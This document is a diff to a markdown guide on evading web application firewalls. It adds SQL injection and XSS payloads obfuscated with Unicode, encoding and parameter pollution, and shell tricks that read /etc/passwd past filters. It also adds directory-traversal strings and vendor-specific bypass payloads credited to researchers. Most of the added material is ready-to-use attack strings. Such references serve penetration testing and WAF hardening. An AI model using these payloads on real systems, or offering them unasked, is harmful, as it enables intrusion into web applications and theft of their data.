@@ -2233,7 +2233,7 @@ Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
 - This method often fails. 
 - Many a times your IP will be blocked (temporarily/permanently).
 
-### Regex-Reversing:
+### Regex Reversing:
 #### Method:
 - Most efficient method of bypassing WAFs.
 - Some WAFs rely upon matching the attack payloads with the signatures in their databases.
@@ -2241,12 +2241,16 @@ Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
 
 #### Techniques:
 
-### Keyword Filter Detection/Bypass
+### Blacklisting Detection/Bypass
+
+- In this method we try to fingerprint the rules step by step by observing the keywords being blacklisted.
+- The idea is to guess the regex and craft the next payloads which doesn't use the blacklisted keywords.
 
 __Case__: SQL Injection
 
 ##### • Step 1:
 __Keywords Filtered__: `and`, `or`, `union`  
+__Probable Regex__: `preg_match('/(and|or|union)/i', $id)`  
 - __Blocked Attempt__: `union select user, password from users`
 - __Bypassed Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
 
@@ -2320,7 +2324,7 @@ __Bypassed__: `%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F`
 __Blocked__: `uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)`  
 __Bypassed__: `uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29`
 
-__3. Unicode Encoding__  
+__3. Unicode Normalization__  
 - ASCII characters in unicode encoding encoding provide great variants for bypassing.
 - You can encode entire/part of the payload for obtaining results.
 
@@ -2330,10 +2334,14 @@ __Obfuscated__: `<marquee onstart=\u0070r\u06f\u006dpt()>`
 __Blocked__: `/?redir=http://google.com`  
 __Bypassed__: `/?redir=http://google。com` (Unicode alternative) 
 
+__Blocked__: `<marquee loop=1 onfinish=alert()>x`
+__Bypassed__: `＜marquee loop＝1 onfinish＝alert︵1)>x` (Unicode alternative)
+> __TIP:__ Have a look at [this](https://hackerone.com/reports/231444) and [this](https://hackerone.com/reports/231389) reports on HackerOne. :)
+
 __Standard__: `../../etc/passwd`  
 __Obfuscated__: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd`
 
-__4. HTML Encoding__
+__4. HTML Representation__
 - Often web apps encode special characters into HTML encoding and render them accordingly.
 - This leads us to basic bypass cases with HTML encoding (numeric/generic).
 
@@ -2372,7 +2380,7 @@ __Obfuscated__: `http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/
 __Standard__: `<script>alert()</script>`  
 __Obfuscated__: `%253Cscript%253Ealert()%253C%252Fscript%253E`
 
-__8. Wildcard Encoding__
+__8. Wildcard Obfuscation__
 - Globbing patterns are used by various command-line utilities to work with multiple files.
 - We can tweak them to execute system commands.
 - Specific to remote code execution vulnerabilities on linux systems.
@@ -2423,7 +2431,7 @@ __Obfuscated__: `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconf
 
 __11. Uninitialized Variables__
 - Uninitialized bash variables can evade bad regular expression based filters and pattern match.
-- Uninitialised variables have value null/they act like empty strings.
+- These have value equal to null/they act like empty strings.
 - Both bash and perl allow this kind of interpretations.
 
 > __BONUS:__ Variable names can have any number of random characters. I have represented them here as `$aaaaaa`, `$bbbbbb`, and so on. You can replace them with any number of random chars like `$ushdjah` and so on.  ;)
@@ -2436,7 +2444,7 @@ __Obfuscated__: `/bin/cat$u /etc/passwd$u`
 __Standard__: `/bin/cat /etc/passwd`  
 __Obfuscated__: <code>$u<b>/bin</b>$u<b>/cat</b>$u $u<b>/etc</b>$u<b>/passwd</b>$u</code>
 
-- __Level 3 Obfuscation__: Random chars   
+- __Level 3 Obfuscation__: Random characters   
 __Standard__: `/bin/cat /etc/passwd`  
 __Obfuscated__: <code>$aaaaaa<b>/bin</b>$bbbbbb<b>/cat</b>$ccccccc $dddddd<b>/etc</b>$eeeeeee<b>/passwd</b>$fffffff</code>
 
@@ -2585,6 +2593,116 @@ The following table shows the support of different character encodings on the te
     </tr>
 </table>
 
+### HTTP Parameter Pollution
+#### Method:
+- This attack method is based on how a server interprets parameters with the same names.
+- Possible bypass chances here are:
+    - The server uses the last received parameter, and WAF checks only the first.
+    - The server unites the value from similar parameters, and WAF checks them separately.
+
+#### Technique:
+- The idea is to enumerate how the parameters are being interpreted by the server.
+- In such a case we can pass the payload to a parameter which isn't being inspected by the WAF.
+- Distributing a payload across parameters which can later get concatenated by the server is also useful.
+
+Below is a comparison of different servers and their relative interpretations:
+
+<table>
+    <tr>
+        <td width="40%" align="center"><b>Environment</b></td>
+        <td width="40%" align="center"><b>Parameter Interpretation</b></td>
+        <td align="center"><b>Example</b></td>
+    </tr>
+    <tr>
+        <td align="center">ASP/IIS</td>
+        <td align="center">Concatenation by comma</td>
+        <td align="center">par1=val1,val2</td>
+    </tr>
+    <tr>
+        <td align="center">JSP, Servlet/Apache Tomcat</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">ASP.NET/IIS</td>
+        <td align="center">Concatenation by comma</td>
+        <td align="center">par1=val1,val2</td>
+    </tr>
+    <tr>
+        <td align="center">PHP/Zeus</td>
+        <td align="center">Last parameter is resulting</td>
+        <td align="center">par1=val2</td>
+    </tr>
+    <tr>
+        <td align="center">PHP/Apache</td>
+        <td align="center">Last parameter is resulting</td>
+        <td align="center">par1=val2</td>
+    </tr>
+    <tr>
+        <td align="center">JSP, Servlet/Jetty</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">IBM Lotus Domino</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">IBM HTTP Server</td>
+        <td align="center">Last parameter is resulting</td>
+        <td align="center">par1=val2</td>
+    </tr>
+    <tr>
+        <td align="center">mod_perl, libapeq2/Apache</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">Oracle Application Server 10G</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">Perl CGI/Apache</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">Python/Zope</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">IceWarp</td>
+        <td align="center">An array is returned</td>
+        <td align="center">['val1','val2']</td>
+    </tr>
+    <tr>
+        <td align="center">AXIS 2400</td>
+        <td align="center">Last parameter is resulting</td>
+        <td align="center">par1=val2</td>
+    </tr>
+    <tr>
+        <td align="center">DBMan</td>
+        <td align="center">Concatenation by two tildes</td>
+        <td align="center">par1=val1~~val2</td>
+    </tr>
+    <tr>
+        <td align="center">mod-wsgi (Python)/Apache</td>
+        <td align="center">An array is returned</td>
+        <td align="center">ARRAY(0x8b9058c)</td>
+    </tr>
+</table>
+
+### HTTP Parameter Fragmentation
+- HPF is based on the principle where the server unites the value being passed along the parameters.
+- We can split the payload into different components and then pass the values via the parameters.
+
+__Sample Payload__: `1001 RLIKE (-(-1)) UNION SELECT 1 FROM CREDIT_CARDS`  
+__Sample Query URL__: `http://test.com/url?a=1001+RLIKE&b=(-(-1))+UNION&c=SELECT+1&d=FROM+CREDIT_CARDS`
+> __TIP:__ A real life example how bypasses can be crafted using this method can be found [here](http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2009-August/005673.html).
+
 ### Browser Bugs:
 #### Charset Bugs:
 - We can try changing charset header to higher Unicode (eg. UTF-32) and test payloads.
@@ -2648,6 +2766,49 @@ An exotic payload example:
 ```
 <a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>pwn3d
 ```
+
+### Using Atypical Equivalent Syntactic Structures
+- This method aims at finding a way of exploitation not considered by the WAF developers.
+- Some use cases can be twitched to critical levels where the WAF cannot detect the payloads at all.
+- This payload is accepted and executed by the server after going through the firewall.
+
+Some common keywords overlooked by WAF developers:
+- JavaScript functions:
+    - `window`
+    - `parent`
+    - `this`
+    - `self`
+- Tag attributes:
+    - `onwheel`
+    - `ontoggle`
+    - `onfilterchange`
+    - `onbeforescriptexecute`
+    - `ondragstart`
+    - `onauxclick`
+    - `onpointerover`
+    - `srcdoc`
+- SQL Operators
+    - `lpad`
+    - `field`
+    - `bit_count`
+
+Example Payloads:  
+- __Case:__ XSS
+```
+<script>window['alert'](0)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](2)</script>
+```
+- __Case:__ SQLi
+```
+SELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);
+1%0b||%0bLPAD(USER,7,1)
+```
+Many alternatives to the original JavaScript can be used, namely:
+- [JSFuck](http://www.jsfuck.com/)
+- [JJEncode](http://utf-8.jp/public/jjencode.html)
+- [XChars.JS](https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html)
+> However the problem in using the above syntactical structures is the long payloads which might possibly be detected by the WAF or may be blocked by the CSP. However, you never know, they might bypass the CSP (if present) too. ;)
 
 ### Abusing SSL/TLS Ciphers:
 - Many a times, servers do accept connections from various SSL/TLS ciphers and versions.
@@ -2880,6 +3041,7 @@ Keep-Alive: 300
 - XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
 ```
 <p draggable=True ondragstart=prompt()>alert
+<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
 ```
 - GET - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
 ```
@@ -2889,7 +3051,6 @@ Keep-Alive: 300
 {3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2B
 h%2Bn)(/0wn3d/.source)" />
 ```
-
 - POST - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
 ```
 <img src="WTF" onError="{var
@@ -3094,6 +3255,14 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 ```
 %2522%253E%253C%2Fdiv%253E%253C%2Fdiv%253E%253Cbrute%2520onbeforescriptexecute%3D%2527confirm%28document.domain%29%2527%253E
 ```
+- [XSS Bypass](https://twitter.com/fransrosen/status/1126963506723590148) by [@Frans Rosén](https://twitter.com/fransrosen)
+```
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+```
+- [XSS Bypass](https://twitter.com/security_prince/status/1127804521315426304) by [@Ishaq Mohammed](https://twitter.com/security_prince)
+```
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+```
 
 ### Profense
 - [GET Type CSRF Attack](https://www.exploit-db.com/exploits/7919) by [@Michael Brooks](https://www.exploit-db.com/?author=628) (>= v.2.6.2)
@@ -3135,6 +3304,12 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 c\\a\\t+/et\\c/pas\\swd
 ```
 
+### URLScan
+- [Directory Traversal](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt#L557) by [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275) (<= v3.1) (Only on ASP.NET)
+```
+http://host.com/test.asp?file=.%./bla.txt
+```
+
 ### WebARX
 - Cross Site Scripting by [@0xInfection](https://twitter.com/0xinfection)
 ```
@@ -3159,6 +3334,10 @@ c\\a\\t+/et\\c/pas\\swd
 ```
 <details ontoggle=alert(1)>
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+```
+- [SQLi Bypass](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt#L562) by [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275)
+```
+10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
 ```
 
 ### Wordfence
